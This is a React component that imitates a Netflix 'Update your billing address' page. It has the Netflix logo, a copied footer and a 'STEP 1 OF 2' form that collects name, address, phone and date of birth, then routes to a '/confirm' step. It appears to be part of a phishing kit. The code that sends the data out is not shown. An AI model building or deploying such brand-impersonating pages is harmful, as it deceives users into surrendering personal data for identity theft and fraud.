import React from "react";
import { useNavigate } from "react-router-dom";
import useStore from "./store";

const Billing = () => {

  const navigate = useNavigate()
  const firstName = useStore((state) => state.firstName)
  const setFirstName = useStore((state) => state.setFirstName)

  const lastName = useStore((state) => state.lastName)
  const setLastName = useStore((state) => state.setLastName)

  const address = useStore((state) => state.address)
  const setAddress = useStore((state) => state.setAddress)

  const city = useStore((state) => state.city)
  const setCity = useStore((state) => state.setCity)

  const stateCity = useStore((state) => state.stateCity)
  const setStateCity = useStore((state) => state.setStateCity)

  const zip = useStore((state) => state.zip)
  const setZip = useStore((state) => state.setZip)

  const phone = useStore((state) => state.phone)
  const setPhone = useStore((state) => state.setPhone)

  const dob = useStore((state) => state.dob)
  const setDob = useStore((state) => state.setDob)

  const nextPage = (e) => {
    e.preventDefault()
    let path = '/confirm'
      navigate(path)
  }
  
  return (
    <>
    <div className="nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
        <a href="/">
          <h2>Sign Out</h2>
        </a>
      </div>
      <div className="body-1">
        <div className="center">
      <div>
        <p>STEP 1 OF 2</p>
      </div>
      <div>
        <h5>Update your billing address.</h5>
      </div>
      <form method="post" onSubmit={nextPage} className="d-flex flex-column">
        <input type="text" className="binfo" name="message" placeholder="First Name" value={firstName} onChange={(evt) => setFirstName(evt.target.value)} required/>
        <input type="text" className="binfo" name="message" placeholder="Last Name" value={lastName} onChange={(evt) => setLastName(evt.target.value)} required/>
        <input type="text" className="binfo" name="message" placeholder="Address" value={address} onChange={(evt) => setAddress(evt.target.value)} required/>
        <input type="text" className="binfo" name="message" placeholder="City" value={city} onChange={(evt) => setCity(evt.target.value)} required/>
        <div className="d-flex">
        <input type="text" className="binfo2" name="message" placeholder="State(Optional)" value={stateCity} autoComplete="off" onChange={(evt) => setStateCity(evt.target.value)}/>
          <input type="text" className="zippy binfo2" name="message" placeholder="Zip / PostCode" value={zip} onChange={(evt) => setZip(evt.target.value)} required/>
        </div>
        <input type="tel" className="binfo" name="message" placeholder="Phone" inputMode="numeric" value={phone} onChange={(evt) => setPhone(evt.target.value)} required/>
        <input type="date" className="binfo" name="message" placeholder="Date of birth (YYYY/MM/DD)" value={dob} onChange={(evt) => setDob(evt.target.value)} required/>
        <button type="submit" className="update-billing">UPDATE BILLING ADDRESS</button>
      </form>
      </div>
      </div>
      <footer>
        <div className="fff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
        <div className="faq">
          <p>FAQ</p>
          <p>Help Center</p>
          <p>Terms of Use</p>
          <p>Privacy</p>
        </div>
        <div className="cookie">
          <p>Cookie Preferences</p>
          <p>Corporate Information</p>
        </div>
        </div>
        </div>
      </footer>
    </>
  )
}

export default Billing